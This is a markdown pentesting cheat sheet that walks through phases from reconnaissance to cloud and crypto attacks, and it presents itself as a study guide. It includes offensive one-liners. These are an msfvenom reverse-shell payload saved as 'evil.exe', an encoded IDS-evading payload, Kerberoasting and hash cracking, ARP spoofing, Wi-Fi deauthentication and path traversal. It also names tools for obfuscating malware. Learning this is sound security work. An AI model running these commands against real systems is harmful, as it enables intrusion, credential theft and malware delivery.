# 🛡️ Complete Ethical Hacking & Web App Pentesting Guide

---

## ⚙️ PHASE 1: Setup & Mindset

### ✅ Essential Tools

* **OS**: Kali Linux, Parrot OS, or BlackArch (preloaded with tools)
* **Browser**: Firefox + HackBar, FoxyProxy
* **Proxy**: [Burp Suite](https://portswigger.net/burp)
* **Recon**: `nmap`, `ffuf`, `subfinder`, `httpx`, `amass`, `assetfinder`
* **Exploitation**: `sqlmap`, `XSStrike`, `wfuzz`, `nuclei`
* **Automation**: `tmux`, custom scripts, `bhedak`
* **Practice Labs**: HackTheBox, TryHackMe, PortSwigger Labs

### 🧠 Mindset Tips

* Think adversarially — "What would an attacker do?"
* Chain small bugs for big results
* Take detailed notes (use: KeepNote, CherryTree, Obsidian)
* Stay within **legal** and **authorized** boundaries

---

## 🔍 PHASE 2: Footprinting & Reconnaissance

### 🔎 Passive Recon

* `whois domain.com`
* Google Dorks:

  ```
  site:target.com intitle:index.of
  site:target.com inurl:admin
  ```
* Tools: Netcraft, Shodan.io, crt.sh, SecurityTrails

### ⚡ Active Recon

```bash
nmap -sC -sV -A target.com
subfinder -d target.com | httpx
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
dnsx -d target.com
waybackurls target.com
```

Use Burp Suite Spider, Repeater, and Target tabs for mapping.

---

## 🕳️ PHASE 3: Vulnerability Analysis

### 🛠️ Tools

* `nikto`, `nuclei`, `wpscan`, `paramspider`, `dalfox`, `kxss`

### 🔬 Manual Checks

* Inject: `'`, `<script>`, `../` in params
* Test for IDOR, SSRF, XSS, CSRF manually
* Check response headers, cookies, CSPs
* Use Burp Extensions: Autorize, Turbo Intruder, JSParser

---

## 💣 PHASE 4: System Hacking & Privilege Escalation

### 🔐 Linux PrivEsc

```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
```

* Tools: `linpeas.sh`, `pspy64`, `GTFOBins`

### 🪟 Windows PrivEsc

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows"
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

* Tools: `winPEAS.exe`, `Seatbelt`, `PrivEscCheck`

---

## 🏢 PHASE 5: Active Directory Hacking

### 🧠 Core Concepts

* Understand users, groups, ACLs, delegation
* Use BloodHound + SharpHound

### 🔥 Common Attacks

```bash
GetUserSPNs.py domain/user:pass -dc-ip <IP> -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt
```

* Tools: `mimikatz`, `crackmapexec`, `Powerview`, `Rubeus`
* Techniques: Kerberoasting, AS-REP Roasting, DCSync, LAPS Abuse

---

## ☠️ PHASE 6: Malware Threats

### 📦 Types

* Keyloggers, Backdoors, Rootkits, Trojans, Ransomware

### 🛠️ Tools

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > evil.exe
```

* Obfuscate with `veil`, `Shellter`, `obfuscator.io`, `donut`
* Use LOLBAS techniques

---

## 🌐 PHASE 7: Network Sniffing & Session Hijacking

### 🛠️ Tools

* `Wireshark`, `tcpdump`, `dsniff`, `ettercap`

### 🧪 Example

```bash
arpspoof -t victimIP gatewayIP
```

* Capture cookies and reuse in Burp

---

## 🎭 PHASE 8: Social Engineering

### ⚔️ Techniques

* Phishing, Pretexting, Vishing
* Tools: `setoolkit`, custom phishing kits

---

## 🕵️ PHASE 9: Evading IDS, Firewalls & Honeypots

### 🧠 Strategies

```bash
msfvenom -p payload -e x86/shikata_ga_nai -i 5 -f exe > evasive.exe
```

* Base64, hex, or custom encoding
* Use `--delay` in tools like `sqlmap`, throttle requests
* Fragment payloads, randomize headers
* Domain fronting, tunneling with `ngrok`, `stunnel`

---

## 🔥 PHASE 10: Advanced Web Server & App Hacking

### Web Server Attacks

* TRACE, PUT methods
* Misconfigured uploads: `.php` with image extensions
* Directory traversal: `../../etc/passwd`

### Web App Attacks

* SQLi, XSS, CSRF, SSRF, IDOR, Open Redirect, HPP, Clickjacking
* Exploit chaining:

  * SSRF → RCE
  * IDOR → takeover
* JWT token attacks: alg=none, weak secrets, kid injection
* Tools: `jwt_tool`, `kidtool`, `postman`

---

## 📶 PHASE 11: Wireless Network Hacking

### Tools

```bash
airmon-ng start wlan0
aiodump-ng wlan0mon
aireplay-ng --deauth 10 -a BSSID wlan0mon
```

* Capture + Crack: `aircrack-ng`, `hashcat`, PMKID with `hcxdumptool`
* Auto: `wifite`, `fluxion`

---

## 📱 PHASE 12: Mobile Hacking

### Android

```bash
apktool d app.apk
jadx-gui app.apk
```

* Tools: `MobSF`, `Frida`, `Objection`
* Bypass SSL pinning, look for hardcoded secrets

### iOS

* Jailbreak or emulator required

---

## 🕵️ PHASE 13: IoT & OT Hacking

### Tools

* `shodan`, `binwalk`, `firmwalker`, `strings`, `ghidra`
* Analyze firmware and configs

---

## ☁️ PHASE 14: Cloud Hacking

### AWS Example

```bash
aws s3 ls s3://bucket-name --no-sign-request
```

* Tools: `ScoutSuite`, `Pacu`, `CloudSploit`, `truffleHog`, `cloudbrute`
* Misconfigs: Open S3, exposed IAM roles, metadata URL abuse

### GCP & Azure

* Tools: `gcloud`, `az cli`, `SkyArk`, `CloudMapper`

---

## 🔐 PHASE 15: Cryptography Attacks

### Common Issues

* ECB mode
* Hardcoded or reused keys
* Poor randomness

### Cracking Hashes

```bash
hashcat -m 0 hashes.txt rockyou.txt
```

* JWT brute force or manipulation
* RSA key cracking with `RsaCtfTool`

---

## ✅ Reporting Template

```markdown
# [Vulnerability Title]
**Target:** https://target.com/page  
**Severity:** High (CVSS v3.1 score: X.X)

---

## 📖 Description
Explain clearly.

---

## ✅ Steps to Reproduce
1. Input this
2. Observe this

---

## 💥 Impact
Explain potential damage.

---

## 🛠️ Recommended Fix
- Patch suggestion
```

---

## ⚠️ Final Advice

* Think like a curious attacker
* Automate recon, manually exploit
* Always try to **chain vulnerabilities**
* Practice in **realistic CTF environments**
* Keep tools updated, learn from writeups
* Stay **legal**, **ethical**, **relentless**

---

## 🎤 Shoutout

* Guide by [Sifat](https://sifat-mdsafitmia.github.io)
